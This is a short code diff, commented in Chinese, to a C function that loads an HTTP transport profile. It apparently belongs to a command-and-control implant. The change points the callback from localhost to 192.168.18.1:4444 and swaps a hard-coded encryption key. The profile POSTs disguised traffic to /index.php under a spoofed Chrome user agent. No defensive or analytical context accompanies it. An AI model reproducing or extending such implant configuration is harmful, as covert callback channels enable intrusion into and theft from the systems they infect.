@@ -639,11 +639,11 @@ VOID ProfileLoad(Profile* p)
 
     /* HTTP 传输配置 */
     strcpy_s(p->http.method, sizeof(p->http.method), "POST");
-    strcpy_s(p->http.target, sizeof(p->http.target), "127.0.0.1:4444");
+    strcpy_s(p->http.target, sizeof(p->http.target), "192.168.18.1:4444");
     strcpy_s(p->http.uri, sizeof(p->http.uri), "/index.php");
     strcpy_s(p->http.user_agent, sizeof(p->http.user_agent), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
     strcpy_s(p->http.content_type, sizeof(p->http.content_type), "application/octet-stream");
-    strcpy_s(p->http.encrypt_key, sizeof(p->http.encrypt_key), "c43e5151e7dff986d2f42c9de108cb03");
+    strcpy_s(p->http.encrypt_key, sizeof(p->http.encrypt_key), "10edff51257a9c29e4cb8e36eb73fa3c");
     strcpy_s(p->encrypt_key, sizeof(p->encrypt_key), p->http.encrypt_key);
     SetDefaultHttpTransform(p);
 
